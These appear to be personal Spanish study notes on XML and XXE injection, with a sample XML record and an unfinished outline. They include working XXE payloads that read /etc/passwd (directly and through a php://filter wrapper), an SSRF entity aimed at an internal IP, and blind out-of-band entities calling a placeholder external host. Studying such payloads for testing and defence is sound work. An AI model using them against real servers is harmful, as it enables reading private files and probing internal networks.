"""
XML = Extensible Markup Language
El xml es un lenguaje de marcado y un formato de archivo para almacenar, transmitir y recoinstruir datos arbitrarios.
Define un conjunto de reglas para codigicar documentos en un formato que se tanto elguible por humanos como por máquinas.

Como se ve una estructura xml?

<?xml version="1.0" encoding='UTF-8'?>
    <root>
        <name>
          Owen
        </name>
        <tel>
         1155321523
        </tel>
        <email>
         hacker@anonymous.dox
        </email>
        <password>
         nashe123!$
        </password>
    </root>

Tiene una estructura de arbol en la que se representan tanto etiquetas como datos (Tree-Like)

ENTIDADES - ENTITY
Son una forma de representar un elemento de datos en una estructura XML sin representar al dato.

!---ENTIDADES GENÉRICAS / CUSTOMIZADAS
*Dtd (Document Type Definition/Declaration)

<!DOCTYPE foo [ <!ENTITY nombre "Manolo"> ]>

&nombre;   <-- Referencia a la entidad nombre con el valor "Manolo"


La palabra *system* es para indicar que queremos ingresar o acceder con un servidor tercero, por lo que lo normal
es esperado una url, pero como en las urls tmb se acepta el wraper file para cargar archivos, se usa mucho el (local file inclussion)

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

Otro wraper tmb podria ser "php://filter/conver.base64-encode/resource=/etc/passwd"

*SSRF -> Server Side Requests Forgery 
Esto se da cuando una aplicacion web permite hacer consultas HTTP del lado del servidor hacia un dominio 
arbitrario elegido por el atacante

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://{internal_red_ip}"> ]>

* XXE - OBB ---> Blind XXE with Out of band interaction

Se trata de realizar un dns lookup.

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{url_burpsuite_pro}" ]>

Algunas estructuras del xml suelen impedir que se injecten entidades en el xml

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{ip}/{file}"> %xxe; ]>

Ahora como hago para exfiltrar data? 


!----ENTIDADES EXTERNAS (XXE)

!----PRE-DEFINIDAS
&lt  --> less than
&gt  --> greater than

"""
